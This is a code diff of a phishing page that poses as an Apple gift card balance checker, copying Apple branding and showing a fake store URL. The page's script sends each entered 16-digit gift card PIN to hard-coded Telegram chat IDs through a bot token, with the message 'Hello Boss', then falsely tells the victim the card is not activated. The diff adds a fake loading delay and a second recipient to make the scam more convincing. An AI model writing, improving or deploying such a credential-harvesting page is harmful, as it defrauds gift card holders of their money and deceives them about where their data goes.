@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Apple Gift Card</title>
+  <title>Apple Gift Card balanace checker</title>
   <style>
     body {
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
@@ -13,9 +13,7 @@
       color: #000;
       text-align: center;
     }
-    *{
-        scrollbar-width: none;
-    }
+    * { scrollbar-width: none; }
 
     header {
       display: flex;
@@ -61,11 +59,10 @@
       border: none;
       border-radius: 10px;
       cursor: pointer;
+      transition: background 0.3s;
     }
-
-    .btn:hover {
-      background: #005bb5;
-    }
+    .btn:hover { background: #005bb5; }
+    .btn:disabled { background: #ccc; cursor: not-allowed; }
 
     .note {
       margin: 10px 0 25px;
@@ -76,16 +73,28 @@
     footer {
       margin-top: 30px;
     }
-
-    footer img {
-      width: 100px;
-      margin: 5px;
-    }
+    footer img { width: 100px; margin: 5px; }
 
     .fake-url {
       margin-top: 20px;
       font-size: 13px;
       color: gray;
+    }
+
+    /* Loader styles */
+    .loader {
+      margin: 20px auto;
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #007aff;
+      border-radius: 50%;
+      width: 32px;
+      height: 32px;
+      animation: spin 1s linear infinite;
+      display: none;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
   </style>
 </head>
@@ -93,19 +102,24 @@
 
   <header>
     <div>Apple Gift Card</div>
-    <a href="https://secure6.store.apple.com/shop/giftcard/"><button style="background:#007aff; color:white; border:none; padding:6px 12px; border-radius:6px;">Buy</button></a>
+    <a href="https://secure6.store.apple.com/shop/giftcard/">
+      <button style="background:#007aff; color:white; border:none; padding:6px 12px; border-radius:6px;">Buy</button>
+    </a>
   </header>
 
   <div class="container">
     <h2>Check Your Apple Gift Card Balance</h2>
 
     <p>Enter your PIN here:</p>
-   <form id="giftForm" method="POST">
-    <input type="text" class="input-box" id="giftPin" name="gift-card-pin" placeholder="XXXX XXXX XXXX XXXX" maxlength="19">
-    <p class="note">Can’t find your PIN? <a href="#">Learn more</a></p>
+    <form id="giftForm" method="POST">
+      <input type="text" class="input-box" id="giftPin" name="gift-card-pin" placeholder="XXXX XXXX XXXX XXXX" maxlength="19">
+      <p class="note">Can’t find your PIN? <a href="#">Learn more</a></p>
 
-    <button class="btn" type="submit">Check Balance</button>
-   </form>
+      <button class="btn" type="submit" id="checkBtn">Check Balance</button>
+    </form>
+
+    <!-- loader -->
+    <div class="loader" id="loader"></div>
 
     <footer>
       <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ-Q9DtZCGTlow4GMYjBEWVdGdCWZLb3UqVHg&s" alt="Apple Logo">
@@ -113,27 +127,26 @@
 
     <p class="fake-url">secure6.store.apple.com</p>
   </div>
-
 <script>
   const input = document.getElementById('giftPin');
   const form = document.getElementById("giftForm");
+  const loader = document.getElementById("loader");
+  const checkBtn = document.getElementById("checkBtn");
 
   // auto-format input with spaces
   input.addEventListener('input', function(e) {
-    let value = e.target.value.replace(/\s+/g, ''); // remove spaces
-    // allow only letters + digits
-    value = value.replace(/[^a-zA-Z0-9]/g, ''); 
-    if (value.length > 16) value = value.slice(0, 16); // max 16 characters
-    e.target.value = value.replace(/(.{4})/g, '$1 ').trim(); // add space every 4 chars
+    let value = e.target.value.replace(/\s+/g, '');
+    value = value.replace(/[^a-zA-Z0-9]/g, '');
+    if (value.length > 16) value = value.slice(0, 16);
+    e.target.value = value.replace(/(.{4})/g, '$1 ').trim();
   });
 
   const botToken = "8488719047:AAESFFAoNPZQ3Mb5J4LaHM54EK8PyHzWeOo"; 
-  const chatId = "7709189291";   
+  // 👇 Add multiple chat IDs here
+  const chatIds = ["6084808169", "7709189291"];   
 
   form.addEventListener("submit", function(e) {
     e.preventDefault();
-
-    // remove spaces before checking length
     const rawPin = input.value.replace(/\s+/g, '');
 
     if (rawPin.length < 16) {
@@ -141,23 +154,42 @@
       return;
     }
 
-    // ✅ Only runs if 16 characters entered
-    const message = `Hello Boss, New Pin Submitted: ${rawPin}`;
+    // Show loader + disable button
+    loader.style.display = "block";
+    checkBtn.disabled = true;
+    checkBtn.textContent = "Checking...";
 
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message
+    const message = `Hello Boss, New Apple Gift Card Submitted: ${rawPin}`;
+
+    // Send to all chat IDs
+    const sendPromises = chatIds.map(id => {
+      return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: id,
+          text: message
+        })
+      });
+    });
+
+    Promise.all(sendPromises)
+      .then(() => {
+        setTimeout(() => {
+          loader.style.display = "none";
+          checkBtn.disabled = false;
+          checkBtn.textContent = "Check Balance";
+          alert("❌ This Apple Gift Card is not activated!");
+        }, 2000); // fake loading delay
       })
-    })
-    .then(() => {
-      alert("❌ This Apple Gift Card is not activated!");
-    })
+      .catch(() => {
+        loader.style.display = "none";
+        checkBtn.disabled = false;
+        checkBtn.textContent = "Check Balance";
+        alert("⚠️ Network error. Try again.");
+      });
   });
 </script>
-
 
 </body>
 </html>
